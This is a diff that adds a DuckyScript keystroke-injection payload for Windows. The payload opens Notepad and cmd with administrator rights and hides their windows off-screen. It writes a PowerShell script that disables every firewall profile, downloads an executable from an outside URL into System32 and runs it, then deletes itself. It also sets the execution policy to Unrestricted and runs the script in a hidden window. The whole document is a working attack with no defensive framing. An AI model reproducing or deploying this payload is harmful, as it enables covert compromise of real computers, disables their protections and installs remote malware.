@@ -1,0 +1,51 @@
+DELAY 750  
+GUI r 
+DELAY 1000
+STRING powershell Start-Process notepad -Verb runAs
+ENTER
+DELAY 750  
+ALT y 
+DELAY 750  
+ENTER
+ALT SPACE 
+DELAY 1000
+STRING m 
+DELAY 1000
+DOWNARROW
+REPEAT 100
+ENTER
+STRING netsh advfirewall set allprofiles state off  
+ENTER 
+STRING (New-Object Net.Webclient).DownloadFile('https://w3g3a5v6.ssl.hwcdn.net/upload2/game/558218/6628222?GoogleAccessId=uploader@moonscript2.iam.gserviceaccount.com&Expires=1672821785&Signature=LEkaIOfU41WimZxx%2BAuE5SxvGKDcicu8Wh%2Bov%2Bbr4id%2FRy%2BFl9HCVZqdRuqxSUkkD3MuEElF0uCfsapv%2F6aUhYfIi1E8P7xwo1v3YzUCfUMD%2FicyLQvVVwqcm7DJihXKGC9SoFogVonJrOn94QuNEZ3W2%2BHu91M05vjnFgln5Sgf1cEV2sDWdd1dI7zGDlNsAGlygw5aJdzZWEInKCnJOtSgo8on8iB6ZZU%2BrTCW6%2BtFEcdbJDfOk4PKS2sV%2FLCRIbCzLE1sWJ6j4eFihmpL5nZKd0b9VDfIS3uWvCZcDaQVX7Zgh1UVYYAePl4OjauJbCpsq4YwSHxgLs%2BocGYVoQ==&hwexp=1672822045&hwsig=7a14476255d3718f6ff66b2631683879',"C:\Windows\System32\67766.exe"); Start-Process -FilePath "C:\Windows\System32\67766.exe"
+ENTER
+
+STRING Remove-Item $MyINvocation.InvocationName 
+ENTER
+CTRL s
+DELAY 1000
+STRING C:\Windows\config-67766.ps1
+ENTER
+DELAY 1000
+ALT F4 
+DELAY 750  
+GUI r 
+DELAY 750  
+STRING powershell Start-Process cmd -Verb runAs 
+ENTER
+DELAY 750  
+ALT y 
+DELAY 1000
+STRING mode con:cols=14 lines=1 
+ENTER
+ALT SPACE 
+DELAY 750  
+STRING m 
+DELAY 750   
+DOWNARROW 
+REPEAT 100
+ENTER
+STRING powershell Set-ExecutionPolicy 'Unrestricted' -Scope CurrentUser -Confirm:$false
+ENTER
+DELAY 750
+STRING powershell.exe -windowstyle hidden -File C:\Windows\config-67766.ps1
+ENTER
